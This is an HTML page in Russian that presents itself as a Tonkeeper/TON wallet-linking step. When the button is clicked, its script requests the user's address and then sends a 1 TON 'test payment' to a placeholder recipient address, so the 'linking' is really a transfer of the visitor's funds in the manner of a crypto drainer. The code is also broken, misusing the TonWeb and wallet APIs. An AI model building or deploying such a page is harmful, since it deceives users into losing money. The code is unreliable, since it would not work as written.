<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Привязка Кошелька TON</title>
    <style>
        body {
            background-color: #111111;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
        }
        button {
            padding: 15px;
            background-color: #0066cc;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 18px;
            margin: 10px;
        }
        button:hover {
            background-color: #005bb5;
        }
    </style>
</head>
<body>
    <h1>Привязка Tonkeeper Кошелька</h1>
    <button id="tonkeeperButton">Подключить Tonkeeper</button>

    <script src="https://cdn.jsdelivr.net/npm/tonweb"></script>
    <script>
        // Подключение Tonkeeper
        document.getElementById('tonkeeperButton').addEventListener('click', async () => {
            if (window.tonkeeper && window.tonkeeper.isTonkeeper) {
                try {
                    // Запросить адрес из Tonkeeper
                    const address = await window.tonkeeper.request({
                        method: 'ton_requestAccounts'
                    });

                    alert('Ваш адрес Tonkeeper: ' + address);

                    // Переход к тестовой транзакции
                    // Запрашиваем тестовую транзакцию
                    const testAmount = '1000000000'; // Тестовая сумма для отправки (например, 1 TON)

                    // Подготовка транзакции
                    const tonweb = new TonWeb();
                    const wallet = tonweb.wallet.create({
                        publicKey: address
                    });

                    // Отправка транзакции
                    const transaction = await wallet.createTransfer({
                        to: '0xRecipientAddressHere',  // Привязанный адрес получателя
                        value: testAmount,
                        sendMode: 3  // Используем sendMode 3 для отправки
                    });

                    await wallet.sendTransaction(transaction);
                    alert('Тестовый платеж успешно отправлен!');
                    window.location.href = '/success';  // Переход на страницу успешной транзакции

                } catch (error) {
                    alert('Ошибка при подключении Tonkeeper: ' + error.message);
                }
            } else {
                alert('Tonkeeper не установлен!');
            }
        });
    </script>
</body>
</html>
